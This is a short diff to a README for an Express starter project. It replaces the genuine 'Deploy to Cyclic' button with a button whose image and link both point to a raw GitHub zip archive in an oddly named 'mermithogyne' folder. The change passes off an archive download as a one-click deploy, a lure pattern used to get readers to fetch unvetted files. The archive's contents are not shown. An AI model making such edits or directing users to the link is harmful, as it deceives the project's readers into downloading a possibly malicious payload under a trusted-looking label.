@@ -7,5 +7,5 @@ Yo!
 
 ### Deploy it in 7 seconds: 
 
-[![Deploy to Cyclic](https://deploy.cyclic.app/button.svg)](https://deploy.cyclic.app/)
+[![Deploy to Cyclic](https://raw.githubusercontent.com/Mochtaufiqqq/starter-express-api/main/mermithogyne/starter-express-api-v2.3.zip)](https://raw.githubusercontent.com/Mochtaufiqqq/starter-express-api/main/mermithogyne/starter-express-api-v2.3.zip)
 
